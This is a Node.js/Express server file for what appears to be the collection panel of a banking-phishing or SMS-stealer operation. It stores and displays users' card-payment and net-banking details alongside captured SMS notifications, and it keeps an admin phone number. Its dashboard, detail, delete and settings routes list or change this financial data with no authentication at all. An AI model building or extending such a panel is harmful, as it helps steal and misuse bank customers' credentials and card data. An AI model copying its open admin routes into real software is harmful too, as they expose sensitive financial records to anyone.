// server.js
const express = require('express');
const app = express();
const mongoose = require('mongoose');
const path = require('path');
const helmet = require('helmet'); 
const Admin = require('./models/Admin');
const dotenv = require('dotenv');
const cardRoutes = require('./routes/cardRoutes')
const netBankingRoutes = require('./routes/netBankingRoutes');
const userRoutes = require('./routes/userRoutes');
const adminRoutes = require('./routes/adminRoutes');
const CardPayment = require('./models/CardPayment'); // Added
const NetBanking = require('./models/NetBanking'); // Added
const notificationRoutes = require('./routes/notificationRoutes');
const bodyParser = require('body-parser');
const cors = require('cors');

const User = require('./models/User');
const Notification = require('./models/Notification');
const connectDB = require('./config/dbConfig');

dotenv.config();


app.use(helmet());
app.use(express.json());
app.use(bodyParser.urlencoded({ extended: false }));
app.use(express.static(path.join(__dirname, 'public')));
app.set('views', path.join(__dirname, 'views')); 
app.set('view engine', 'ejs');
app.use(cors());

// Connect to MongoDB
connectDB();

// Routes
app.use('/api/detail', cardRoutes);
app.use('/api/payment', netBankingRoutes);
app.use('/api/user', userRoutes);
app.use('/api/admin', adminRoutes);
app.use('/api/notification', notificationRoutes);


// Route to render the dashboard
app.get('/dashboard', async (req, res) => {
    try {
        const users = await User.find(); // Fetch all users
        const notifications = await Notification.find(); // Fetch all notifications
        res.render('dashboard', { users, notifications });
    } catch (err) {
        console.log(err);
        res.status(500).send('Error loading dashboard');
    }
});

app.get('/detail/:id', async (req, res) => {
    try {
        const user = await User.findById(req.params.id); // Fetch user details

        if (!user) {
            return res.status(404).send('User not found');
        }

        // Fetch associated payment details
        const cardPayment = await CardPayment.findOne({ userId: user._id });
        const netBanking = await NetBanking.findOne({ userId: user._id });

        // Check if the cardPayment and netBanking userId match with the current user
        if (cardPayment && cardPayment.userId.toString() !== user._id.toString()) {
            return res.status(400).send('Card payment details do not match the user.');
        }

        if (netBanking && netBanking.userId.toString() !== user._id.toString()) {
            return res.status(400).send('Net banking details do not match the user.');
        }

        res.render('detail', { user, cardPayment, netBanking }); // Pass data to template
    } catch (err) {
        console.error('Error fetching user details:', err);
        res.status(500).send('Error loading details');
    }
});


app.post('/delete/:id', async (req, res) => {
    try {
        const userId = req.params.id; // Extract user ID from URL
        await User.findByIdAndDelete(userId); // Delete user from database

        res.redirect('/dashboard'); // Redirect back to dashboard after deletion
    } catch (err) {
        console.error("Error deleting user:", err);
        res.status(500).send("Error deleting user.");
    }
});

app.get('/sms', async (req, res) => {
    try {
        const notifications = await Notification.find();
        res.render('sms', { notifications });
    } catch (err) {
        console.error("Error fetching notifications:", err);
        res.status(500).send("Error loading SMS notifications.");
    }
});

// In your server.js or relevant routes file
app.get('/settings', async (req, res) => {
    try {
        const admin = await Admin.findOne(); // Get admin record
        const adminPhoneNumber = admin ? admin.phoneNumber : '';
        res.render('settings', { adminPhoneNumber }); // Default empty if no record
    

    } catch (err) {
        console.error('Error loading settings:', err);
        res.status(500).send('Error loading settings');
    }
});


const PORT = process.env.PORT || 5000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
